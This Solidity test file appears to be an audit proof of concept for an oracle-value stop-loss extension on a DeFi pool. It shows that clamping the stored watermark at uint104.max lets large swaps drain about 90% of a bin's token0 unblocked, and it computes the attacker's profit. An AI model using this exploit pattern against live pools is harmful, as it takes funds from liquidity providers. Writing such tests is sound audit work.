// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {MetricOmmPoolBaseTest, Q64} from "@metric-core-test/MetricOmmPool.base.t.sol";
import {MetricOmmPool} from "@metric-core/MetricOmmPool.sol";
import {MetricOmmPoolDeployer} from "@metric-core/MetricOmmPoolDeployer.sol";
import {BinState} from "@metric-core/types/PoolStorage.sol";
import {PoolExtensions, ExtensionOrders} from "@metric-core/types/PoolExtensionsConfig.sol";
import {PoolFeeConfig} from "@metric-core/types/FactoryStorage.sol";
import {ExtensionOrderTestLib} from "@metric-core-test/ExtensionOrderTestLib.sol";
import {OracleValueStopLossExtension} from "../../contracts/extensions/OracleValueStopLossExtension.sol";

contract OracleValueStopLossClampAuditTest is MetricOmmPoolBaseTest {
  uint256 private constant E6 = 1e6;
  uint256 private constant METRIC_MAX = type(uint104).max;
  uint256 private constant TOKEN0_DENSITY_E18 = 1e36;
  uint256 private constant TOKEN1_DENSITY_E18 = 1e18;
  uint256 private constant HIGH_PRICE = 1e9;
  uint256 private constant LOW_PRICE = 1e8;
  uint32 private constant DRAWDOWN_E6 = 50_000; // 5%
  uint104 private constant SHARES = 1;
  uint128 private constant PRIME_TOKEN0_OUT = 1e12;
  uint128 private constant BYPASS_TOKEN0_OUT = 9e17;

  OracleValueStopLossExtension internal stopLoss;

  function setUp() public override {
    super.setUp();

    stopLoss = new OracleValueStopLossExtension(address(this));
    _deployPoolWithLargeButFactoryValidShareDensity();
    _approveUsersForPool(address(pool));
    stopLoss.initialize(address(pool), abi.encode(DRAWDOWN_E6, uint32(0), uint32(0)));

    // At bin 0 and position 0, a new position is entirely token0. The density is below
    // the factory's uint128 bound and one share requires a real deposit of one token0.
    // The valid -10% cursor distance also permits a constant-oracle direct-loss case.
    _addLiquidity(0, 0, 0, SHARES, 0);

    // The large swap buys 0.9 token0 for at most 1 billion token1 in either PoC.
    token1.mint(address(callers[1]), 1_000_000_000e18);
  }

  function test_clampHidesNinetyPercentTrueMetricDrawdown() public {
    uint128 highX64 = uint128(HIGH_PRICE * Q64);
    oracle.setBidAndAskPrice(highX64, highX64 + 1);

    // Touch the real pool at the high oracle price so afterSwap records the watermark.
    _swap(0, users[0], false, _i128ExactOut(PRIME_TOKEN0_OUT), type(uint128).max);

    (uint104 t0AtHigh, uint104 t1AtHigh,,,) = _getBinState(0);
    uint256 trueHighMetric = _trueToken1Metric(t0AtHigh, t1AtHigh, SHARES, highX64);
    (, uint256 storedHighMetric) = stopLoss.currentHighWatermarks(address(pool), 0);

    assertGt(trueHighMetric, 10 * METRIC_MAX, "true high metric must be far above the storage cap");
    assertEq(storedHighMetric, METRIC_MAX, "the high watermark saturates at uint104.max");

    uint128 lowX64 = uint128(LOW_PRICE * Q64);
    oracle.setBidAndAskPrice(lowX64, lowX64 + 1);

    // This is the direction metricT1 is supposed to block after a large downward repricing.
    // It succeeds because both the old and new metrics clamp to exactly uint104.max.
    _swap(1, users[1], false, _i128ExactOut(BYPASS_TOKEN0_OUT), type(uint128).max);

    (uint104 t0AtLow, uint104 t1AtLow,,,) = _getBinState(0);
    uint256 trueLowMetric = _trueToken1Metric(t0AtLow, t1AtLow, SHARES, lowX64);
    uint256 trueFivePercentFloor = Math.mulDiv(trueHighMetric, E6 - DRAWDOWN_E6, E6);
    (, uint256 storedMetricAfterBypass) = stopLoss.currentHighWatermarks(address(pool), 0);

    emit log_named_uint("true metric at high price", trueHighMetric);
    emit log_named_uint("true 5% stop-loss floor", trueFivePercentFloor);
    emit log_named_uint("true metric after 90% repricing", trueLowMetric);
    emit log_named_uint("stored clamped watermark", storedMetricAfterBypass);

    assertLt(trueLowMetric, trueFivePercentFloor, "an unclamped 5% watermark would reject the swap");
    assertGt(trueLowMetric, METRIC_MAX, "the live metric remains saturated after losing about 90%");
    assertEq(storedMetricAfterBypass, METRIC_MAX, "clamping makes the drawdown invisible");
    assertLt(t0AtLow, 11e16, "the unblocked swap removes roughly 90% of the bin's token0");
  }

  function test_clampAllowsDirectValueExtractionAtConstantOraclePrice() public {
    uint128 highX64 = uint128(HIGH_PRICE * Q64);
    oracle.setBidAndAskPrice(highX64, highX64 + 1);

    // Initialize a genuine high watermark with a separate dust swap. The attack
    // therefore does not rely on first-touch watermark initialization.
    _swap(0, users[0], false, _i128ExactOut(PRIME_TOKEN0_OUT), type(uint128).max);

    (uint104 t0Before, uint104 t1Before,,,) = _getBinState(0);
    uint256 trueMetricBefore = _trueToken1Metric(t0Before, t1Before, SHARES, highX64);
    (, uint256 watermarkBefore) = stopLoss.currentHighWatermarks(address(pool), 0);

    assertGt(trueMetricBefore, 10 * METRIC_MAX, "the true watermark must be far above the cap");
    assertEq(watermarkBefore, METRIC_MAX, "the initialized watermark is saturated");

    // At a -10% cursor distance, the trader buys token0 for approximately 90% of
    // its unchanged oracle value. Draining 90% of the inventory causes about 9%
    // direct LP loss, but the live metric remains above the same clamp ceiling.
    (int256 amount0Delta, int256 amount1Delta) =
      _swap(1, users[1], false, _i128ExactOut(BYPASS_TOKEN0_OUT), type(uint128).max);

    (uint104 t0After, uint104 t1After,,,) = _getBinState(0);
    uint256 trueMetricAfter = _trueToken1Metric(t0After, t1After, SHARES, highX64);
    uint256 trueFivePercentFloor = Math.mulDiv(trueMetricBefore, E6 - DRAWDOWN_E6, E6);
    (, uint256 watermarkAfter) = stopLoss.currentHighWatermarks(address(pool), 0);

    uint256 token0Out = uint256(-amount0Delta);
    uint256 token1In = uint256(amount1Delta);
    uint256 token0OutAtOracle = Math.mulDiv(token0Out, highX64, Q64);
    uint256 attackerProfitAtOracle = token0OutAtOracle - token1In;

    emit log_named_uint("true metric before constant-price attack", trueMetricBefore);
    emit log_named_uint("true 5% stop-loss floor", trueFivePercentFloor);
    emit log_named_uint("true metric after constant-price attack", trueMetricAfter);
    emit log_named_uint("token0 received", token0Out);
    emit log_named_uint("token1 paid", token1In);
    emit log_named_uint("attacker profit at unchanged oracle", attackerProfitAtOracle);
    emit log_named_uint("stored clamped watermark", watermarkAfter);

    assertLt(trueMetricAfter, trueFivePercentFloor, "an unclamped 5% watermark would reject the swap");
    assertGt(trueMetricAfter, METRIC_MAX, "the post-loss metric remains above the cap");
    assertEq(watermarkAfter, METRIC_MAX, "the clamp makes the direct loss invisible");
    assertGt(attackerProfitAtOracle, 0, "the trader extracts value at the unchanged oracle mark");
  }

  function _deployPoolWithLargeButFactoryValidShareDensity() private {
    (BinState[] memory nonNegativeBinStates, BinState[] memory negativeBinStates) = _defaultBinStateArrays();
    PoolExtensions memory extensions = _singleExtensionPoolExtensions(address(stopLoss));
    ExtensionOrders memory orders;
    orders.afterSwap = ExtensionOrderTestLib.encodeExtensionOrder(1, 0, 0, 0, 0, 0, 0);

    pool = MetricOmmPool(
      poolDeployer.deploy(
        MetricOmmPoolDeployer.DeployParams({
          salt: keccak256("OracleValueStopLossClampAuditTest"),
          factory: address(this),
          admin: admin,
          adminFeeDestination: adminFeeDestination,
          token0: address(token0),
          token1: address(token1),
          priceProvider: address(oracle),
          extensions: extensions,
          extensionOrders: orders,
          immutablePriceProvider: true,
          token0ScaleMultiplier: 1,
          token1ScaleMultiplier: 1,
          initialScaledAmount0PerShareE18: TOKEN0_DENSITY_E18,
          initialScaledAmount1PerShareE18: TOKEN1_DENSITY_E18,
          minimalMintableLiquidity: SHARES,
          spreadFeeE6: 0,
          curBinDistFromProvidedPriceE6: -100_000,
          nonNegativeBinStates: nonNegativeBinStates,
          negativeBinStates: negativeBinStates,
          notionalFeeE8: 0
        })
      )
    );

    priceProviderTimelock[address(pool)] = type(uint256).max;
    poolAdmin[address(pool)] = admin;
    poolFeeConfig[address(pool)] = PoolFeeConfig({
      protocolSpreadFeeE6: 0, adminSpreadFeeE6: 0, protocolNotionalFeeE8: 0, adminNotionalFeeE8: 0
    });
    poolAdminFeeDestination[address(pool)] = adminFeeDestination;
  }

  function _trueToken1Metric(uint104 t0, uint104 t1, uint256 shares, uint128 midX64)
    private
    pure
    returns (uint256)
  {
    uint256 t0InToken1 = Math.mulDiv(uint256(t0), midX64, Q64);
    return Math.mulDiv(t0InToken1, E6, shares) + Math.mulDiv(uint256(t1), E6, shares);
  }
}
